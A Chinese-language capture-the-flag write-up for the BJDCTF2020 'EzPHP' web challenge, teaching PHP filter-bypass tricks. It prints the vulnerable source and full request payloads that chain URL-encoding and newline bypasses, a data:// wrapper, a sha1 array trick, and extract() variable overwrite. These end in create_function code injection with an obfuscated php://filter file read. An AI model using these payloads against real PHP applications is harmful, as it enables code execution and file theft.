# \[BJDCTF2020]EzPHP

## \[BJDCTF2020]EzPHP

## 考点

* base32
* `$_SERVER['QUERY_STRING']`不进行URL解码，用`URL编码`绕过
* `$_GET['debu']`要是aqua\_is\_cute但又不能是aqua\_is\_cute，用`%0a`换行符绕过
* `$_REQUEST`中参数值不能出现字母，<mark style="color:orange;">`$_REQUEST`</mark><mark style="color:orange;">是优先读取POST传参再读取GET传参，可以先POST再GET</mark>
* `file_get_contents($file)`一般配合`php://input`，还可以配合`data://text/plain,debu_debu_aqua`
* `$code('', $arg);`对应`create_function`
* 代码执行可以看一下`get_defined_vars()`

## wp

F12给了一段密文`GFXEIM3YFZYGQ4A=`

目测是base家族的，64，32，16等等试一下，发现是base32，解码是`1nD3x.php`

给了源码

```php
 <?php
highlight_file(__FILE__);
error_reporting(0); 

$file = "1nD3x.php";
$shana = $_GET['shana'];
$passwd = $_GET['passwd'];
$arg = '';
$code = '';

echo "<br /><font color=red><B>This is a very simple challenge and if you solve it I will give you a flag. Good Luck!</B><br></font>";

if($_SERVER) { 
    if (
        preg_match('/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i', $_SERVER['QUERY_STRING'])
        )  
        die('You seem to want to do something bad?'); 
}

if (!preg_match('/http|https/i', $_GET['file'])) {
    if (preg_match('/^aqua_is_cute$/', $_GET['debu']) && $_GET['debu'] !== 'aqua_is_cute') { 
        $file = $_GET["file"]; 
        echo "Neeeeee! Good Job!<br>";
    } 
} else die('fxck you! What do you want to do ?!');

if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('fxck you! I hate English!'); 
    } 
} 

if (file_get_contents($file) !== 'debu_debu_aqua')
    die("Aqua is the cutest five-year-old child in the world! Isn't it ?<br>");


if ( sha1($shana) === sha1($passwd) && $shana != $passwd ){
    extract($_GET["flag"]);
    echo "Very good! you know my password. But what is flag?<br>";
} else{
    die("fxck you! you don't know my password! And you don't know sha1! why you come here!");
}

if(preg_match('/^[a-z0-9]*$/isD', $code) || 
preg_match('/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&|\$|\*|\||\<|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i', $arg) ) { 
    die("<br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="); 
} else { 
    include "flag.php";
    $code('', $arg); 
} ?> 
```

一点一点看，`$_SERVER['QUERY_STRING']`是get方式传入的内容，它不会进行URL解码，可以用URL编码可以绕过这个限制

然后`$_GET['file']`不能有`http(s)`，`$_GET['debu']`要是`aqua_is_cute`，这个可以用换行符绕过

`?deb%75=aq%75a_is_c%75te%0a&file=a`

![](<../../.gitbook/assets/image (5) (1) (1) (1) (1).png>)



然后是\_REQUEST中参数值不能出现字母，\_REQUEST是优先读取POST传参再读取GET传参，可以先POST再GET

```
GET /1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&file=a

POST file=1&debu=1
```

寄了，BUUOJ环境有问题，本地复现吧。访问`1nD3x.php?file=***`，明显应该到`Aqua is the cutest five-year-old child in the world!`那里的`die`的，但是得到的回显还是`fxck you! I hate English!`

接着是要满足`file_get_contents($file)`的结果为`debu_debu_aqua`，一般这种可以用`php://input`，但是这里已经有了POST的内容，可以换成data伪协议。

```
GET /1nD3x.php?debu=aqua_is_cute%0a&file=data://text/plain,debu_debu_aqua

GET /1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61
POST file=1&debu=1
```

然后是经典的绕HASH，`sha1($shana) === sha1($passwd) && $shana != $passwd`，直接传数组即可

```
GET /1nD3x.php?debu=aqua_is_cute%0a&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2

GET /1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2

POST file=1&debu=1
```

然后看到`extract($_GET["flag"]);`，存在变量覆盖。最后一段代码是对`$code`和`$arg`进行操作，但是题目并不能直接传参，那就是要用变量覆盖进行传参。

然后`if(preg_match('/^[a-z0-9]*$/isD', $code)`是code中不能有字母数字，在后面一个正则过滤了很多关键字，这样`$arg`就不是很好绕过了

最后的`$code('', $arg);`是`create_function`，这个出现了很多次了。

```
GET /1nD3x.php?debu=aqua_is_cute%0a&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}var_dump(a);//



GET /1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=%7D%76%61%72%5F%64%75%6D%70%28%61%29%3B%2F%2F
POST file=1&debu=1
```

![](<../../.gitbook/assets/image (23) (1) (1) (1) (1).png>)

成功输出，最后是怎么获取flag。代码执行没有过滤call\_user\_func，文件包含没有过滤require，目录扫描没有过滤DirectoryIterator

其实一开始想的是无参RCE和取反，后面看了wp一下，在get\_defined\_vars()中看到一个奇怪的变量`ffffffff11111114ggggg`，意思就是flag在`rea1fl4g.php` ，应该是文件读取了。

```
require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)
```

最后用取反绕过滤

```
<?php
echo urlencode(~'php://filter/read=convert.base64-encode/resource=rea1fl4g.php');

// %8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F

require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F))
```

最后的payload

```
GET /1nD3x.php?debu=aqua_is_cute%0a&file=data://text/plain,debu_debu_aqua&shana[]=1&passwd[]=2&flag[code]=create_function&flag[arg]=}require(~(%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F));//

GET /1nD3x.php?%64%65%62%75=%61%71%75%61%5F%69%73%5F%63%75%74%65%0a&file=%64%61%74%61%3A%2F%2F%74%65%78%74%2F%70%6C%61%69%6E%2C%64%65%62%75%5F%64%65%62%75%5F%61%71%75%61&%73%68%61%6E%61[]=1&%70%61%73%73%77%64[]=2&%66%6C%61%67%5B%63%6F%64%65%5D=%63%72%65%61%74%65%5F%66%75%6E%63%74%69%6F%6E&%66%6C%61%67%5B%61%72%67%5D=%7D%72%65%71%75%69%72%65%28%7E%28%8F%97%8F%C5%D0%D0%99%96%93%8B%9A%8D%D0%8D%9A%9E%9B%C2%9C%90%91%89%9A%8D%8B%D1%9D%9E%8C%9A%C9%CB%D2%9A%91%9C%90%9B%9A%D0%8D%9A%8C%90%8A%8D%9C%9A%C2%8D%9A%9E%CE%99%93%CB%98%D1%8F%97%8F%29%29%3B%2F%2F
POST file=1&debu=1
```

解码即可
